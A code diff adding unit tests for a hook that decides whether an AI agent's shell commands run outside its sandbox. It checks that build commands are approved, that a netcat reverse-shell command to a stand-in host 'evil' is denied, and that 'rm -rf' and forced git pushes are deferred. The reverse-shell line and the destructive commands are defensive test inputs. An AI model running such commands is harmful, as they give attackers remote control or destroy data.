@@ -1,6 +1,7 @@
 import { describe, expect, test } from "vitest";
 import {
   classifyCommand,
+  createEscalationOnToolUse,
   isSandboxFailure,
   isToolchainFailure,
   runOnHost,
@@ -253,5 +254,37 @@ describe("runOnHost", () => {
     const result = await runOnHost("echo 'a\nb\nc' | head -2", { cwd: "/tmp" });
     expect(result.exitCode).toBe(0);
     expect(result.stdout.trim().split("\n")).toHaveLength(2);
+  });
+});
+
+// ── createEscalationOnToolUse ───────────────────────────────────────────────────
+
+describe("createEscalationOnToolUse", () => {
+  const hook = createEscalationOnToolUse({ allowUnsandboxedCommands: true });
+
+  test("approves allow-listed build/test commands on a bash tool", async () => {
+    expect(await hook({ name: "Bash", args: { command: "swift build" } })).toEqual({ action: "approve" });
+    expect(await hook({ name: "Bash", args: { command: "bun run test" } })).toEqual({ action: "approve" });
+    expect(await hook({ name: "Bash", args: { command: "git status" } })).toEqual({ action: "approve" });
+  });
+
+  test("denies hard-blocked commands", async () => {
+    const d = await hook({ name: "Bash", args: { command: "nc -e /bin/sh evil 1234" } });
+    expect(d).toMatchObject({ action: "deny" });
+  });
+
+  test("defers deny-classified commands to the runtime posture (continue)", async () => {
+    expect(await hook({ name: "Bash", args: { command: "rm -rf build" } })).toEqual({ action: "continue" });
+    expect(await hook({ name: "Bash", args: { command: "git push --force" } })).toEqual({ action: "continue" });
+  });
+
+  test("never affects non-bash tools", async () => {
+    expect(await hook({ name: "Read", args: { file_path: "/x" } })).toEqual({ action: "continue" });
+    expect(await hook({ name: "Edit", args: { command: "swift build" } })).toEqual({ action: "continue" });
+  });
+
+  test("is a no-op when escalation is disabled", async () => {
+    const off = createEscalationOnToolUse({ allowUnsandboxedCommands: false });
+    expect(await off({ name: "Bash", args: { command: "swift build" } })).toEqual({ action: "continue" });
   });
 });
